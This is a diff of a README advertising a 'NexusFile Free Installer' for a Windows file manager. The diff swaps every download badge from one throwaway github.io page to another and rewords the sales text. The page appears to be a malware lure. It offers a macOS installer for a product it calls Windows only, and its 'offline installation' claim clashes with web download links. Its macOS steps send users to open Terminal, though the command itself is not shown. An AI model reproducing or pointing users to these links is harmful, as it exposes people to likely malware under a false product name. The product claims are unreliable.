@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 NexusFile Free Installer** — NexusFile is a free, feature-rich dual-pane file manager for Windows that combines simplicity with powerful functionality. Works without internet access, no account required. Full offline installation.
+**💻 NexusFile Free Installer** — NexusFile is a free, powerful dual-pane file manager for Windows with a classic commander-style interface. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NexusFile](https://img.shields.io/badge/⬇_Install_NexusFile-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NexusFile](https://img.shields.io/badge/⬇_Install_NexusFile-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About NexusFile
 
-NexusFile is a free, feature-rich dual-pane file manager for Windows that combines simplicity with powerful functionality. Navigate files with a twin-panel interface, use built-in archive management, FTP connectivity, and batch file operations. NexusFile supports plugins for extended functionality and offers a tabbed interface for managing multiple locations simultaneously.
+NexusFile is a free, powerful dual-pane file manager for Windows with a classic commander-style interface. It features tabbed browsing, FTP/SFTP connections, archive management, and extensive keyboard shortcut support for power users.
 
 ---
 
 ## ❌ Problem: NexusFile is hard to access
 
-- **Windows Only** — No cross-platform support
-- **Dated Interface** — Visual design less modern than newer file managers
-- **Plugin Ecosystem** — Community plugins vary in quality and maintenance
-- **Documentation** — English documentation can be sparse for some features
+- **Windows Only** — Not available on macOS or Linux
+- **Dated Interface** — Commander-style UI has not been significantly modernized
+- **Development Pace** — Updates arrive infrequently
+- **Competition** — Total Commander offers more features and a larger community
 
 ---
 
@@ -61,9 +61,9 @@ NexusFile is a free, feature-rich dual-pane file manager for Windows that combin
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ NexusFile is a free, feature-rich dual-pane file manager for Windows that combin
 
 <div align="center">
 
-[![⬇ Install NexusFile](https://img.shields.io/badge/⬇_Install_NexusFile-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NexusFile](https://img.shields.io/badge/⬇_Install_NexusFile-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ NexusFile is a free, feature-rich dual-pane file manager for Windows that combin
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ NexusFile is a free, feature-rich dual-pane file manager for Windows that combin
 
 ---
 
-**NexusFile Free Installer** — NexusFile is a free, feature-rich dual-pane file manager for Windows that combines simplicity with powerful functionality. Install without internet connection today!
+**NexusFile Free Installer** — NexusFile is a free, powerful dual-pane file manager for Windows with a classic commander-style interface. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install NexusFile](https://img.shields.io/badge/⬇_Install_NexusFile-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NexusFile](https://img.shields.io/badge/⬇_Install_NexusFile-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
